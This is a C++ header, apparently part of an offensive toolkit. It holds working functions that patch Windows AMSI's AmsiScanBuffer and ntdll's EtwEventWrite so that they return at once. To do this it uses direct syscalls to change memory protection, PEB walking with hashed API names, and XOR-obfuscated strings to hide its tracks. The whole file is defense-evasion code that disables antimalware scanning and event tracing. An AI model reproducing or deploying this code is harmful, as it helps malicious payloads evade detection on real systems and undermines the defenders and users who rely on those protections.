#pragma once
#include "common.hpp"
#include "hash.hpp"
#include "peb.hpp"
#include "syscall.hpp"
#include "xorstr.hpp"

namespace stealth::bypass {

    namespace h {
        constexpr unsigned int amsi_dll       = HASH_CI ("amsi.dll");
        constexpr unsigned int AmsiScanBuffer = HASH ("AmsiScanBuffer");
        constexpr unsigned int EtwEventWrite  = HASH ("EtwEventWrite");
    }

    inline bool patch_bytes (uintptr_t addr, const unsigned char* patch, size_t size) {
        if (!addr) return false;
        PVOID base = reinterpret_cast<PVOID>(addr); SIZE_T sz = size; ULONG old_prot = 0;
        NTSTATUS status = sc::invoke<NTSTATUS> (sc::h::NtProtectVM, NtCurrentProcess (), &base, &sz, (ULONG)PAGE_EXECUTE_READWRITE, &old_prot);
        if (!NT_SUCCESS (status)) return false;
        mem_copy (reinterpret_cast<void*>(addr), patch, size);
        base = reinterpret_cast<PVOID>(addr); sz = size;
        sc::invoke<NTSTATUS> (sc::h::NtProtectVM, NtCurrentProcess (), &base, &sz, old_prot, &old_prot);
        sc::invoke<NTSTATUS> (sc::h::FlushIC, NtCurrentProcess (), reinterpret_cast<PVOID>(addr), size);
        return true;
    }

    inline bool patch_amsi () {
        uintptr_t ntdll = peb::get_module_base (sc::h::ntdll);
        if (!ntdll) return false;
        using fn_LdrLoadDll = NTSTATUS (NTAPI*)(PWSTR, PULONG, PUNICODE_STRING, PVOID*);
        using fn_RtlInitUStr = void (NTAPI*)(PUNICODE_STRING, PCWSTR);
        auto ldr_load = reinterpret_cast<fn_LdrLoadDll>(peb::get_export (ntdll, sc::h::LdrLoadDll));
        auto rtl_init = reinterpret_cast<fn_RtlInitUStr>(peb::get_export (ntdll, sc::h::RtlInitUniStr));
        if (!ldr_load || !rtl_init) return false;

        wchar_t amsi_name[9];
        XOR_W_STACK (L"amsi.dll", amsi_name);
        UNICODE_STRING us; rtl_init (&us, amsi_name);
        PVOID amsi_base = nullptr;
        NTSTATUS status = ldr_load (nullptr, nullptr, &us, &amsi_base);
        mem_set (amsi_name, 0, sizeof (amsi_name));
        if (!NT_SUCCESS (status) || !amsi_base) return false;

        uintptr_t amsi_scan = peb::get_export (reinterpret_cast<uintptr_t>(amsi_base), h::AmsiScanBuffer);
        if (!amsi_scan) return false;
        static constexpr unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
        return patch_bytes (amsi_scan, patch, sizeof (patch));
    }

    inline bool patch_etw () {
        uintptr_t ntdll = peb::get_module_base (sc::h::ntdll);
        if (!ntdll) return false;
        uintptr_t etw_write = peb::get_export (ntdll, h::EtwEventWrite);
        if (!etw_write) return false;
        static constexpr unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
        return patch_bytes (etw_write, patch, sizeof (patch));
    }
}
